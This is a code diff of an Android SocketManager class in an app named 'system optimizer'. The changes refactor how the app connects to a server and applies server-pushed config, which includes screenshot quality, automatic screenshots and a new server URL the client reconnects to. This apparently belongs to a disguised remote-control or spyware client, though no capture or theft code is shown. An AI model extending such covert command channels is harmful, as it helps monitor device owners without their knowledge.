@@ -8,8 +8,6 @@ import java.util.UUID;
 
 import android.content.Context;
 
-import com.system.optimizer.R;
-
 import android.content.SharedPreferences;
 import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.ConfigManager;
@@ -63,24 +61,9 @@ public class SocketManager {
         Log.d(TAG, "Full query being sent: " + opts.query);
 
         try {
-            // Check if we have a stored server URL
             String serverUrl = this.configManager.getStoredServerUrl();
 
-            if (serverUrl != null && !serverUrl.isEmpty()) {
-                // Not first run - use stored URL
-                Log.d(TAG, "Using stored server URL: " + serverUrl);
-            } else {
-                // First run - use URL from build (SERVER_URL)
-                serverUrl = appContext.getString(R.string.SERVER_URL);
-                Log.d(TAG, "First run - using SERVER_URL from build: " + serverUrl);
-
-                Log.d(TAG, "Storing initial SERVER_URL in SharedPreferences for future runs");
-                this.configManager.setServerUrl(serverUrl);
-            }
-
-            String nameSpace = ConfigManager.SOCKET_NAMESPACE;
-
-            socket = IO.socket(serverUrl + nameSpace, opts);
+            socket = IO.socket(serverUrl, opts);
             socket.connect();
 
             socket.on(Socket.EVENT_CONNECT_ERROR, (Object... args) -> {
@@ -92,37 +75,24 @@ public class SocketManager {
                 if (args != null && args.length > 0) {
                     try {
                         org.json.JSONObject configJson = (org.json.JSONObject) args[0];
-                        String newServerUrl = configJson.optString("server_url", null);
-                        int screenshotQuality = configJson.optInt("screenshot_quality", 70);
-                        boolean autoScreenshot = configJson.optBoolean("auto_screenshot", false);
 
-                        if (newServerUrl != null && !newServerUrl.isEmpty()) {
-                            newServerUrl = ConfigData.parseUrl(newServerUrl);
-                            String currentServerUrl = this.configManager.getStoredServerUrl();
+                        ConfigData serverConfig = configManager.createConfigFromJson(configJson);
+                        String newServerUrl = serverConfig.getServerUrl();
 
-                            // Check if server URL has changed
-                            if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
-                                Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);
+                        // Get current stored URL before updating config
+                        String currentServerUrl = this.configManager.getStoredServerUrl();
 
-                                this.configManager.setServerUrl(newServerUrl);
+                        Log.d(TAG, "Refreshing config data from server");
+                        this.configManager.setConfig(serverConfig);
 
-                                // Store full config
-                                ConfigData serverConfig = new ConfigData(newServerUrl, screenshotQuality,
-                                        autoScreenshot);
-                                configManager.storeConfig(serverConfig);
+                        // Check if server URL has changed
+                        if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
+                            Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);
 
-                                // Disconnect and reconnect to new URL
-                                Log.d(TAG, "Disconnecting from current socket to reconnect to new URL");
-                                disconnect(false); // Don't clear listeners, we want to keep them for the new connection
+                            Log.d(TAG, "Disconnecting from current socket to reconnect to new URL");
+                            disconnect(false); // Don't clear listeners, we want to keep them for the new connection
 
-                                this.connect();
-                            } else {
-                                // Store full config
-                                ConfigData serverConfig = new ConfigData(newServerUrl, screenshotQuality,
-                                        autoScreenshot);
-                                configManager.storeConfig(serverConfig);
-                                Log.d(TAG, "Socket URL unchanged, no reconnection needed");
-                            }
+                            this.connect();
                         }
                     } catch (Exception e) {
                         Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
@@ -201,7 +171,8 @@ public class SocketManager {
 
     /**
      * Disconnects the socket.
-     * * @param clearPersistentListeners If true, the persistentListenerMap will be cleared.
+     * * @param clearPersistentListeners If true, the persistentListenerMap will be
+     * cleared.
      * Use 'false' if you plan to reconnect to another URL
      * and want to keep your app's event subscriptions.
      */
